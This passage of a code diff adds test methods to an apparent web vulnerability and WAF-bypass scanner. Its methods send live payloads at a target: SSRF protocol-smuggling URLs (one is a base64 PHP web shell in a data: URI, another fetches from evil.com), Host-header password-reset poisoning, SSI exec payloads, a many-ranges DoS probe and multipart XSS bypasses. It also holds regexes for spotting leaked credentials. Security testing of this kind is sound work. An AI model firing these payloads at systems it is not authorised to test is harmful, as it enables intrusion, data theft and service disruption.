+            ('ldap://127.0.0.1:389/%0astats%0aquit', 'LDAP'),
+            
+            # TFTP protocol
+            ('tftp://127.0.0.1/test', 'TFTP'),
+            
+            # Netdoc (Java)
+            ('netdoc:///etc/passwd', 'Netdoc'),
+            
+            # Jar protocol (Java)
+            ('jar:http://evil.com/test.jar!/test.txt', 'Jar'),
+            
+            # PHP wrappers
+            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'PHP Filter'),
+            ('php://input', 'PHP Input'),
+            ('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==', 'PHP Data'),
+            ('expect://id', 'PHP Expect'),
+            
+            # Cloud metadata (various formats)
+            ('http://[::ffff:169.254.169.254]/', 'IPv6 mapped metadata'),
+            ('http://169.254.169.254.xip.io/', 'DNS rebind metadata'),
+            ('http://0x7f000001/', 'Hex localhost'),
+            ('http://0177.0.0.1/', 'Octal localhost'),
+            ('http://2130706433/', 'Decimal localhost'),
+            ('http://127.1/', 'Short localhost'),
+            ('http://0/', 'Zero localhost'),
+        ]
+        
+        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'src', 'source', 'file', 'document', 'page']
+        
+        for payload, technique in ssrf_protocols:
+            for param in ssrf_params[:3]:  # Limit params
+                try:
+                    encoded_payload = quote(payload, safe='')
+                    
+                    # Test GET
+                    resp = safe_request(
+                        f"{self.target}/?{param}={encoded_payload}",
+                        timeout=self.timeout + 3
+                    )
+                    
+                    if resp:
+                        # Check for successful protocol access indicators
+                        indicators = [
+                            'root:', 'daemon:', '[extensions]',  # File access
+                            'redis_version', 'memcached',  # Services
+                            'ldap', 'uid=', 'cn=',  # LDAP
+                            'DOCTYPE', '<?xml',  # XML responses
+                            'meta-data', 'ami-id',  # AWS
+                        ]
+                        
+                        if any(ind in resp.text.lower() for ind in indicators):
+                            result = {
+                                'technique': f'SSRF Protocol: {technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Protocol smuggling successful via {param}',
+                                'severity': 'CRITICAL',
+                                'category': 'SSRF_PROTOCOL'
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: SSRF {technique} via {param}")
+                            
+                except Exception as e:
+                    logger.debug(f"SSRF protocol test error: {e}")
+        
+        return results
+    
+    def _test_host_header_attacks(self) -> List[Dict[str, Any]]:
+        """Host header attacks - password reset poisoning, cache poisoning"""
+        results = []
+        print("  [*] Testing Host header attacks...")
+        
+        # Password reset poisoning endpoints
+        reset_endpoints = [
+            '/reset-password', '/forgot-password', '/password/reset',
+            '/api/password/reset', '/auth/forgot', '/account/recover',
+            '/users/password/new', '/password/forgot'
+        ]
+        
+        # Host header attack payloads
+        host_attacks = [
+            # Basic host injection
+            {'Host': 'evil.com'},
+            {'Host': f'{self.domain}@evil.com'},
+            {'Host': f'{self.domain}:evil.com'},
+            {'Host': f'evil.com#{self.domain}'},
+            
+            # X-Forwarded-Host attacks
+            {'X-Forwarded-Host': 'evil.com'},
+            {'X-Host': 'evil.com'},
+            {'X-Forwarded-Server': 'evil.com'},
+            
+            # Double Host header
+            # Note: requests library doesn't support this easily
+            
+            # Absolute URL override
+            {'Host': self.domain, 'X-Original-URL': 'http://evil.com/'},
+            
+            # Port injection
+            {'Host': f'{self.domain}:443@evil.com'},
+            {'Host': f'{self.domain}:evil.com:80'},
+        ]
+        
+        # Test on reset endpoints
+        for endpoint in reset_endpoints:
+            for attack_headers in host_attacks[:5]:
+                try:
+                    # Try POST request (common for password reset)
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        data={'email': 'test@test.com'},
+                        headers=attack_headers,
+                        timeout=self.timeout,
+                        verify=False,
+                        allow_redirects=False
+                    )
+                    
+                    if resp:
+                        # Check if evil.com appears in response (link poisoning)
+                        if 'evil.com' in resp.text or 'evil.com' in resp.headers.get('Location', ''):
+                            attack_type = list(attack_headers.keys())[0]
+                            result = {
+                                'technique': f'Host Header Poison: {attack_type}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Attacker host reflected at {endpoint}',
+                                'severity': 'HIGH',
+                                'category': 'HOST_HEADER_ATTACK'
+                            }
+                            results.append(result)
+                            print(f"  [✓] Host Header Poison at {endpoint}")
+                            
+                except Exception as e:
+                    logger.debug(f"Host header attack error: {e}")
+        
+        # Test routing bypass
+        internal_hosts = ['localhost', '127.0.0.1', 'internal', 'admin.internal', '10.0.0.1']
+        for internal_host in internal_hosts:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    headers={'Host': internal_host}
+                )
+                
+                if resp and resp.status_code == 200:
+                    if len(resp.content) != self._baseline_size:
+                        result = {
+                            'technique': f'Host Routing Bypass: {internal_host}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Different content with internal host',
+                            'severity': 'MEDIUM',
+                            'category': 'HOST_HEADER_ATTACK'
+                        }
+                        results.append(result)
+                        print(f"  [!] Routing bypass with Host: {internal_host}")
+                        
+            except Exception as e:
+                logger.debug(f"Host routing error: {e}")
+        
+        return results
+    
+    def _test_ssi_injection(self) -> List[Dict[str, Any]]:
+        """Server-Side Includes (SSI) injection testing"""
+        results = []
+        print("  [*] Testing SSI injection...")
+        
+        ssi_payloads = [
+            # Command execution
+            ('<!--#exec cmd="id"-->', 'exec cmd'),
+            ('<!--#exec cmd="whoami"-->', 'exec whoami'),
+            ('<!--#exec cgi="/bin/ls"-->', 'exec cgi'),
+            
+            # File inclusion
+            ('<!--#include virtual="/etc/passwd"-->', 'include passwd'),
+            ('<!--#include file="/etc/passwd"-->', 'include file'),
+            ('<!--#include virtual="/.htpasswd"-->', 'include htpasswd'),
+            
+            # Echo variables
+            ('<!--#echo var="DOCUMENT_ROOT"-->', 'echo docroot'),
+            ('<!--#echo var="SERVER_SOFTWARE"-->', 'echo server'),
+            ('<!--#echo var="DATE_LOCAL"-->', 'echo date'),
+            
+            # Config
+            ('<!--#config errmsg="SSI_VULNERABLE"-->', 'config errmsg'),
+            ('<!--#config timefmt="%Y"-->', 'config timefmt'),
+            
+            # Printenv
+            ('<!--#printenv-->', 'printenv'),
+            
+            # Flastmod
+            ('<!--#flastmod file="index.html"-->', 'flastmod'),
+            
+            # Encoded variations
+            ('%3C!--#exec%20cmd=%22id%22--%3E', 'encoded exec'),
+        ]
+        
+        # Common SSI-enabled extensions
+        ssi_extensions = ['.shtml', '.stm', '.shtm', '.html']
+        
+        for payload, technique in ssi_payloads:
+            for ext in ssi_extensions:
+                try:
+                    encoded_payload = quote(payload)
+                    
+                    # Test in query parameter
+                    resp = safe_request(
+                        f"{self.target}/test{ext}?input={encoded_payload}",
+                        timeout=self.timeout
+                    )
+                    
+                    if resp:
+                        # Check for SSI execution indicators
+                        indicators = ['uid=', 'root:', 'www-data', 'apache', 'SSI_VULNERABLE', '/var/www']
+                        
+                        if any(ind in resp.text for ind in indicators):
+                            result = {
+                                'technique': f'SSI Injection: {technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': 'SSI command executed',
+                                'severity': 'CRITICAL',
+                                'category': 'SSI_INJECTION'
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: SSI Injection ({technique})")
+                            
+                except Exception as e:
+                    logger.debug(f"SSI test error: {e}")
+        
+        return results
+    
+    def _test_api_key_exposure(self) -> List[Dict[str, Any]]:
+        """Detect exposed API keys and secrets in responses"""
+        results = []
+        print("  [*] Scanning for exposed API keys/secrets...")
+        
+        # API key patterns (regex)
+        secret_patterns = {
+            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
+            'AWS Secret Key': r'[0-9a-zA-Z/+]{40}',
+            'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
+            'GitHub OAuth': r'gho_[0-9a-zA-Z]{36}',
+            'GitLab Token': r'glpat-[0-9a-zA-Z\-]{20}',
+            'Slack Token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*',
+            'Slack Webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+',
+            'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
+            'Google OAuth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
+            'Firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
+            'Stripe Live': r'sk_live_[0-9a-zA-Z]{24}',
+            'Stripe Test': r'sk_test_[0-9a-zA-Z]{24}',
+            'Square OAuth': r'sq0atp-[0-9A-Za-z\-_]{22}',
+            'Square Access': r'sq0csp-[0-9A-Za-z\-_]{43}',
+            'PayPal/Braintree': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
+            'Twilio API': r'SK[0-9a-fA-F]{32}',
+            'Twilio SID': r'AC[a-zA-Z0-9_\-]{32}',
+            'SendGrid': r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}',
+            'Mailgun': r'key-[0-9a-zA-Z]{32}',
+            'Mailchimp': r'[0-9a-f]{32}-us[0-9]{1,2}',
+            'Heroku API': r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
+            'DigitalOcean': r'dop_v1_[a-f0-9]{64}',
+            'NPM Token': r'npm_[A-Za-z0-9]{36}',
+            'Discord Token': r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}',
+            'Discord Webhook': r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9\-_]+',
+            'Telegram Bot': r'[0-9]+:AA[0-9A-Za-z\-_]{33}',
+            'Facebook Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
+            'Twitter API': r'[1-9][0-9]+-[0-9a-zA-Z]{40}',
+            'Azure Storage': r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}',
+            'Private Key': r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
+            'JWT Token': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*',
+            'Basic Auth': r'[Aa]uthorization:\s*[Bb]asic\s+[A-Za-z0-9+/=]+',
+            'Bearer Token': r'[Bb]earer\s+[A-Za-z0-9_\-\.]+',
+            'Password in URL': r'[a-zA-Z]{3,10}://[^/\s:@]+:[^/\s:@]+@[^/\s:@]+',
+            'MongoDB URI': r'mongodb(\+srv)?://[^\s<>"]+',
+            'PostgreSQL URI': r'postgres(ql)?://[^\s<>"]+',
+            'MySQL URI': r'mysql://[^\s<>"]+',
+        }
+        
+        # Endpoints likely to expose secrets
+        sensitive_endpoints = [
+            '/', '/config', '/settings', '/env', '/debug',
+            '/api/config', '/api/settings', '/.env', '/config.json',
+            '/app/config', '/application.properties', '/application.yml'
+        ]
+        
+        compiled_patterns = {name: re.compile(pattern) for name, pattern in secret_patterns.items()}
+        
+        for endpoint in sensitive_endpoints:
+            try:
+                resp = safe_request(
+                    f"{self.target}{endpoint}",
+                    timeout=self.timeout,
+                    allow_redirects=True
+                )
+                
+                if resp and resp.status_code == 200:
+                    content = resp.text
+                    
+                    for secret_name, pattern in compiled_patterns.items():
+                        matches = pattern.findall(content)
+                        if matches:
+                            # Mask the secret
+                            masked = matches[0][:10] + '...' if len(matches[0]) > 10 else matches[0]
+                            
+                            result = {
+                                'technique': f'Exposed Secret: {secret_name}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Found at {endpoint}: {masked}',
+                                'severity': 'CRITICAL',
+                                'category': 'API_KEY_EXPOSURE',
+                                'details': {'endpoint': endpoint, 'type': secret_name}
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: {secret_name} exposed at {endpoint}")
+                            
+            except Exception as e:
+                logger.debug(f"API key scan error: {e}")
+        
+        return results
+    
+    def _test_dns_zone_transfer(self) -> List[Dict[str, Any]]:
+        """Attempt DNS zone transfer (AXFR)"""
+        results = []
+        print("  [*] Testing DNS zone transfer...")
+        
+        try:
+            import subprocess
+            
+            # Extract domain
+            domain = self.domain
+            
+            # Get nameservers
+            try:
+                ns_records = socket.getaddrinfo(f"ns1.{domain}", None) or []
+            except:
+                ns_records = []
+            
+            # Common nameserver prefixes
+            ns_prefixes = ['ns1', 'ns2', 'dns1', 'dns2', 'ns', 'dns']
+            nameservers = []
+            
+            for prefix in ns_prefixes:
+                try:
+                    ns = f"{prefix}.{domain}"
+                    ip = socket.gethostbyname(ns)
+                    nameservers.append(ns)
+                except:
+                    pass
+            
+            # Attempt zone transfer using dig (if available)
+            for ns in nameservers[:2]:
+                try:
+                    result_proc = subprocess.run(
+                        ['dig', f'@{ns}', domain, 'AXFR', '+short'],
+                        capture_output=True,
+                        text=True,
+                        timeout=10
+                    )
+                    
+                    output = result_proc.stdout
+                    
+                    if output and 'Transfer failed' not in output and len(output) > 50:
+                        result = {
+                            'technique': f'DNS Zone Transfer: {ns}',
+                            'bypass': True,
+                            'status': 0,
+                            'reason': f'Zone transfer successful from {ns}',
+                            'severity': 'HIGH',
+                            'category': 'DNS_ZONE_TRANSFER',
+                            'details': {'records_preview': output[:500]}
+                        }
+                        results.append(result)
+                        print(f"  [✓] Zone Transfer: {ns}")
+                        
+                except subprocess.TimeoutExpired:
+                    pass
+                except FileNotFoundError:
+                    # dig not available
+                    result = {
+                        'technique': 'DNS Zone Transfer',
+                        'bypass': False,
+                        'status': 0,
+                        'reason': 'dig command not available - manual testing recommended',
+                        'severity': 'INFO',
+                        'category': 'DNS_ZONE_TRANSFER'
+                    }
+                    results.append(result)
+                    break
+                except Exception as e:
+                    logger.debug(f"Zone transfer error: {e}")
+                    
+        except Exception as e:
+            logger.debug(f"DNS zone transfer test error: {e}")
+        
+        return results
+    
+    def _test_verb_tampering_extended(self) -> List[Dict[str, Any]]:
+        """Extended HTTP verb/method tampering"""
+        results = []
+        print("  [*] Testing extended verb tampering...")
+        
+        # Extended HTTP methods
+        methods = [
+            'TRACE', 'TRACK', 'DEBUG', 'CONNECT',
+            'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK',  # WebDAV
+            'SEARCH', 'PATCH', 'PURGE', 'LINK', 'UNLINK',
+            'VIEW', 'CHECKOUT', 'CHECKIN', 'REPORT', 'VERSION-CONTROL',
+            'ARBITRARY', 'FAKE', 'TEST',  # Custom methods
+        ]
+        
+        for method in methods:
+            try:
+                resp = self._session.request(
+                    method,
+                    self.target,
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp:
+                    # TRACE/TRACK can lead to XST (Cross-Site Tracing)
+                    if method in ['TRACE', 'TRACK'] and resp.status_code == 200:
+                        if 'TRACE' in resp.text or method in resp.text:
+                            result = {
+                                'technique': f'XST via {method}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'{method} method enabled - XST possible',
+                                'severity': 'MEDIUM',
+                                'category': 'VERB_TAMPERING'
+                            }
+                            results.append(result)
+                            print(f"  [!] XST: {method} enabled")
+                    
+                    # DEBUG method
+                    elif method == 'DEBUG' and resp.status_code in [200, 500]:
+                        if 'debug' in resp.text.lower() or 'stack' in resp.text.lower():
+                            result = {
+                                'technique': 'DEBUG Method Enabled',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': 'DEBUG method returns debug info',
+                                'severity': 'HIGH',
+                                'category': 'VERB_TAMPERING'
+                            }
+                            results.append(result)
+                            print(f"  [!] DEBUG method enabled")
+                    
+                    # WebDAV methods
+                    elif method in ['PROPFIND', 'MKCOL', 'COPY', 'MOVE'] and resp.status_code in [200, 207, 201]:
+                        result = {
+                            'technique': f'WebDAV: {method}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'WebDAV {method} method enabled',
+                            'severity': 'MEDIUM',
+                            'category': 'VERB_TAMPERING'
+                        }
+                        results.append(result)
+                        print(f"  [!] WebDAV: {method} enabled")
+                    
+                    # Custom methods accepted
+                    elif method in ['ARBITRARY', 'FAKE', 'TEST'] and resp.status_code not in [400, 405, 501]:
+                        result = {
+                            'technique': f'Custom Method: {method}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Server accepts arbitrary HTTP method',
+                            'severity': 'LOW',
+                            'category': 'VERB_TAMPERING'
+                        }
+                        results.append(result)
+                        
+            except Exception as e:
+                logger.debug(f"Verb tampering error for {method}: {e}")
+        
+        return results
+    
+    def _test_range_header_attacks(self) -> List[Dict[str, Any]]:
+        """Range header attacks - overlapping ranges, many ranges (DoS)"""
+        results = []
+        print("  [*] Testing Range header attacks...")
+        
+        range_attacks = [
+            # Many ranges (potential DoS)
+            ('bytes=' + ','.join([f'{i}-{i+1}' for i in range(0, 1000, 2)]), 'Many ranges (500)'),
+            
+            # Overlapping ranges
+            ('bytes=0-100,50-150,100-200', 'Overlapping ranges'),
+            
+            # Negative ranges
+            ('bytes=-1', 'Negative start'),
+            ('bytes=0--1', 'Double negative'),
+            
+            # Invalid ranges
+            ('bytes=100-0', 'Reversed range'),
+            ('bytes=abc-xyz', 'Invalid characters'),
+            
+            # Large range
+            ('bytes=0-999999999999', 'Very large range'),
+            
+            # Multiple overlapping
+            ('bytes=0-0,0-0,0-0,0-0,0-0', 'Repeated zero ranges'),
+            
+            # Suffix ranges
+            ('bytes=-500,-500,-500,-500,-500', 'Multiple suffix ranges'),
+        ]
+        
+        for range_header, technique in range_attacks:
+            try:
+                start_time = time.time()
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout + 5,
+                    headers={'Range': range_header}
+                )
+                elapsed = time.time() - start_time
+                
+                if resp:
+                    # Check for unusual response
+                    if resp.status_code == 206:  # Partial Content
+                        if 'Many ranges' in technique and elapsed > 2:
+                            result = {
+                                'technique': f'Range DoS: {technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Server processed many ranges (took {elapsed:.1f}s)',
+                                'severity': 'MEDIUM',
+                                'category': 'RANGE_ATTACK'
+                            }
+                            results.append(result)
+                            print(f"  [!] Range DoS potential: {technique}")
+                    
+                    # Check for error disclosure
+                    if resp.status_code in [400, 416, 500] and 'error' in resp.text.lower():
+                        result = {
+                            'technique': f'Range Error Disclosure: {technique}',
+                            'bypass': False,
+                            'status': resp.status_code,
+                            'reason': 'Range header causes error disclosure',
+                            'severity': 'LOW',
+                            'category': 'RANGE_ATTACK'
+                        }
+                        results.append(result)
+                        
+            except Exception as e:
+                logger.debug(f"Range attack error: {e}")
+        
+        return results
+    
+    def _test_multipart_bypass(self) -> List[Dict[str, Any]]:
+        """Multipart boundary manipulation for WAF bypass"""
+        results = []
+        print("  [*] Testing multipart boundary bypasses...")
+        
+        # XSS payload to test
+        xss_payload = '<script>alert(1)</script>'
+        
+        # Boundary manipulation techniques
+        multipart_attacks = [
+            # Standard multipart
+            (
+                '--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--boundary--',
+                'multipart/form-data; boundary=boundary',
+                'Standard multipart'
+            ),
+            
+            # Long boundary
+            (
+                '--' + 'A' * 1000 + '\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--' + 'A' * 1000 + '--',
+                'multipart/form-data; boundary=' + 'A' * 1000,
+                'Long boundary'
+            ),
+            
+            # Special characters in boundary
+            (
+                '--bound@ry!\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--bound@ry!--',
+                'multipart/form-data; boundary=bound@ry!',
+                'Special chars boundary'
+            ),
+            
+            # Quoted boundary
+            (
+                '--"boundary"\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--"boundary"--',
+                'multipart/form-data; boundary="boundary"',
+                'Quoted boundary'
+            ),
+            
+            # Missing boundary in content-type
+            (
+                '--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--boundary--',
+                'multipart/form-data',
+                'Missing boundary param'
+            ),
+            
+            # CRLF variations
+            (
+                '--boundary\nContent-Disposition: form-data; name="test"\n\n' + xss_payload + '\n--boundary--',
+                'multipart/form-data; boundary=boundary',
+                'LF only (no CR)'
+            ),
+            
+            # Extra headers
+            (
+                '--boundary\r\nContent-Disposition: form-data; name="test"\r\nX-Bypass: true\r\n\r\n' + xss_payload + '\r\n--boundary--',
+                'multipart/form-data; boundary=boundary',
+                'Extra headers'
+            ),
+            
+            # Filename injection
+            (
+                '--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.txt\r\n\r\n' + xss_payload + '\r\n--boundary--',
+                'multipart/form-data; boundary=boundary',
+                'Filename CRLF injection'
+            ),
+        ]
+        
+        for body, content_type, technique in multipart_attacks:
+            try:
+                resp = self._session.post(
+                    self.target,
+                    data=body.encode(),
+                    headers={'Content-Type': content_type},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp:
+                    # Check if XSS payload was reflected (WAF bypassed)
+                    if xss_payload in resp.text:
+                        result = {
+                            'technique': f'Multipart Bypass: {technique}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'XSS payload reflected via multipart bypass',
+                            'severity': 'HIGH',
+                            'category': 'MULTIPART_BYPASS'
+                        }
+                        results.append(result)
+                        print(f"  [✓] Multipart Bypass: {technique}")
+                    
+                    # Check if server processed malformed multipart
+                    elif resp.status_code in [200, 201] and 'Invalid' not in technique:
+                        result = {
+                            'technique': f'Multipart Accepted: {technique}',
+                            'bypass': False,
+                            'status': resp.status_code,
+                            'reason': f'Server processed {technique}',
+                            'severity': 'LOW',
+                            'category': 'MULTIPART_BYPASS'
+                        }
+                        results.append(result)
+                        
+            except Exception as e:
+                logger.debug(f"Multipart bypass error: {e}")
+        
+        return results
+    
+    def _test_dns_rebinding(self) -> List[Dict[str, Any]]:
+        """DNS rebinding attack detection"""
+        results = []
+        print("  [*] Testing DNS rebinding susceptibility...")
+        
+        # DNS rebinding test domains (these resolve to different IPs over time)
+        rebind_domains = [
+            f'rebind.127.0.0.1.xip.io',
+            f'rebind.169.254.169.254.nip.io',
+            f'127.0.0.1.xip.io',
+            f'169.254.169.254.nip.io',
+            f'localtest.me',  # Always resolves to 127.0.0.1
+            f'lvh.me',  # Always resolves to 127.0.0.1
+        ]
+        
+        # Check if target validates Host header properly
+        for rebind_domain in rebind_domains:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    headers={'Host': rebind_domain}
+                )
+                
+                if resp and resp.status_code == 200:
+                    # Check if different content returned
+                    if len(resp.content) != self._baseline_size:
+                        result = {
+                            'technique': f'DNS Rebinding: {rebind_domain}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Server accepts rebinding domain {rebind_domain}',
+                            'severity': 'MEDIUM',
+                            'category': 'DNS_REBINDING'
+                        }
+                        results.append(result)
+                        print(f"  [!] DNS Rebinding susceptible with {rebind_domain}")
+                        
+            except Exception as e:
+                logger.debug(f"DNS rebinding error: {e}")
+        
+        # Test SSRF with rebinding domains
+        ssrf_params = ['url', 'redirect', 'link', 'src']
+        for rebind_domain in rebind_domains[:2]:
+            for param in ssrf_params[:2]:
+                try:
+                    resp = safe_request(
+                        f"{self.target}/?{param}=http://{rebind_domain}/",
+                        timeout=self.timeout
+                    )
+                    
+                    if resp and 'localhost' in resp.text.lower() or '127.0.0.1' in resp.text:
+                        result = {
+                            'technique': f'SSRF DNS Rebind: {rebind_domain}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'SSRF protection bypassed via DNS rebinding',
+                            'severity': 'HIGH',
+                            'category': 'DNS_REBINDING'
+                        }
+                        results.append(result)
+                        print(f"  [✓] SSRF DNS Rebinding successful")
+                        
+                except Exception as e:
+                    logger.debug(f"SSRF rebinding error: {e}")
+        
+        return results
+    
+    def _test_timing_based_discovery(self) -> List[Dict[str, Any]]:
+        """Timing-based blind resource discovery"""
+        results = []
+        print("  [*] Testing timing-based resource discovery...")
+        
+        # Get baseline timing
+        baseline_times = []
+        for _ in range(3):
+            try:
+                start = time.time()
+                resp = safe_request(f"{self.target}/nonexistent_{int(time.time())}", timeout=self.timeout)
+                baseline_times.append(time.time() - start)
+            except:
+                baseline_times.append(1.0)
+        
+        baseline_avg = sum(baseline_times) / len(baseline_times)
+        
+        # Resources that might have different timing
+        timing_resources = [
+            '/admin', '/administrator', '/wp-admin', '/login',
+            '/api/users', '/api/admin', '/graphql', '/internal',
+            '/debug', '/server-status', '/metrics', '/health',
+            '/.git', '/.env', '/config', '/backup'
+        ]
+        
+        timing_anomalies = []
+        
+        for resource in timing_resources:
+            try:
+                times = []
+                for _ in range(2):
+                    start = time.time()
+                    resp = safe_request(f"{self.target}{resource}", timeout=self.timeout)
+                    times.append(time.time() - start)
+                
+                avg_time = sum(times) / len(times)
+                
+                # Significant timing difference might indicate resource exists
+                if avg_time > baseline_avg * 1.5 or avg_time < baseline_avg * 0.5:
+                    timing_anomalies.append({
+                        'resource': resource,
+                        'avg_time': avg_time,
+                        'baseline': baseline_avg,
+                        'status': resp.status_code if resp else 0
+                    })
+                    
+            except Exception as e:
+                logger.debug(f"Timing test error: {e}")
+        
+        for anomaly in timing_anomalies:
+            diff = anomaly['avg_time'] - anomaly['baseline']
+            direction = 'slower' if diff > 0 else 'faster'
+            
+            result = {
+                'technique': f"Timing Anomaly: {anomaly['resource']}",
+                'bypass': False,
+                'status': anomaly['status'],
+                'reason': f'Response {abs(diff):.2f}s {direction} than baseline',
+                'severity': 'LOW',
+                'category': 'TIMING_DISCOVERY',
+                'details': anomaly
+            }
+            results.append(result)
+            print(f"  [*] Timing anomaly: {anomaly['resource']} ({direction})")
+        
+        return results
+    
+    def _test_error_based_disclosure(self) -> List[Dict[str, Any]]:
+        """Force verbose error messages for information disclosure"""
+        results = []
+        print("  [*] Testing error-based information disclosure...")
+        
+        # Error-triggering payloads
+        error_triggers = [
+            # Type errors
+            ("/?id[]=1", "Array type confusion"),
+            ("/?id={}", "Object type confusion"),
+            ("/?id=null", "Null value"),
+            ("/?id=undefined", "Undefined value"),
+            
+            # Numeric errors
+            ("/?id=9" * 100, "Large number"),
+            ("/?id=-1", "Negative number"),
+            ("/?id=0", "Zero value"),
+            ("/?id=1.1.1", "Invalid number format"),
+            ("/?id=1e999", "Overflow number"),
+            
+            # String errors
+            ("/?id=" + "A" * 10000, "Very long string"),
+            ("/?id=%00", "Null byte"),
+            ("/?id=\x00", "Raw null"),
+            
+            # Format string
+            ("/?id=%s%s%s%s%s", "Format string"),
+            ("/?id=%n%n%n%n", "Format string %n"),
+            ("/?id=%x%x%x%x", "Format string %x"),
+            
+            # Special characters
+            ("/?id=<>\"'`", "Special chars"),
+            ("/?id=../../../", "Path traversal chars"),
+            
+            # Invalid encoding
+            ("/?id=%GG", "Invalid URL encoding"),
+            ("/?id=%%", "Double percent"),
+            
+            # JSON errors
+            ("/?data={invalid}", "Invalid JSON"),
+            ("/?data={\"key\":", "Incomplete JSON"),
+        ]
+        
+        error_indicators = [
+            'exception', 'error', 'traceback', 'stack trace', 'syntax',
+            'warning', 'fatal', 'debug', 'at line', 'undefined', 'null',
+            'parse error', 'type error', 'reference error', 'sql',
+            'mysql', 'postgresql', 'oracle', 'sqlite', 'odbc',
+            'asp.net', 'java.lang', 'python', 'php', 'ruby',
+            'node_modules', 'node.js', 'express', 'django', 'laravel',
+            'spring', 'struts', 'tomcat', 'apache', 'nginx',
+            'internal server error', 'application error'
+        ]
+        
+        for payload, technique in error_triggers:
+            try:
+                resp = safe_request(
+                    f"{self.target}{payload}",
+                    timeout=self.timeout
+                )
+                
+                if resp:
+                    content_lower = resp.text.lower()
+                    
+                    found_indicators = [ind for ind in error_indicators if ind in content_lower]
+                    
+                    if found_indicators and resp.status_code in [400, 500, 501, 502, 503]:
+                        severity = 'MEDIUM' if len(found_indicators) > 2 else 'LOW'
+                        
+                        result = {
+                            'technique': f'Error Disclosure: {technique}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Verbose error: {", ".join(found_indicators[:3])}',
+                            'severity': severity,
+                            'category': 'ERROR_DISCLOSURE'
+                        }
+                        results.append(result)
+                        print(f"  [!] Error disclosure via {technique}")
+                        
+            except Exception as e:
+                logger.debug(f"Error disclosure test error: {e}")
+        
+        return results
+    
+    def _test_path_normalization_extended(self) -> List[Dict[str, Any]]:
+        """Extended path normalization bypasses"""
+        results = []
+        print("  [*] Testing extended path normalization...")
+        
+        # Target sensitive paths
+        sensitive_paths = ['/admin', '/api', '/internal', '/config']
+        
+        # Normalization bypass techniques
+        norm_techniques = [
+            # Dot segments
+            ('/./TARGETPATH', 'Single dot'),
+            ('/../TARGETPATH', 'Parent traversal'),
+            ('/TARGETPATH/.', 'Trailing dot'),
+            ('/TARGETPATH/..', 'Trailing parent'),
+            
+            # Multiple slashes
+            ('//TARGETPATH', 'Double slash'),
+            ('///TARGETPATH', 'Triple slash'),
+            ('/TARGETPATH//', 'Trailing double slash'),
+            
+            # Backslash (Windows)
+            ('/TARGETPATH\\', 'Trailing backslash'),
+            ('\\TARGETPATH', 'Leading backslash'),
+            ('/TARGETPATH\\..\\', 'Backslash traversal'),
+            
+            # URL encoding variations
+            ('/%2e/TARGETPATH', 'Encoded dot'),
+            ('/TARGETPATH%2f', 'Encoded trailing slash'),
+            ('/%2e%2e/TARGETPATH', 'Encoded parent'),
+            ('/%252e%252e/TARGETPATH', 'Double encoded'),
+            
+            # Null byte
+            ('/TARGETPATH%00', 'Null byte suffix'),
+            ('/TARGETPATH%00.html', 'Null + extension'),
+            
+            # Semicolon
+            ('/TARGETPATH;', 'Semicolon suffix'),
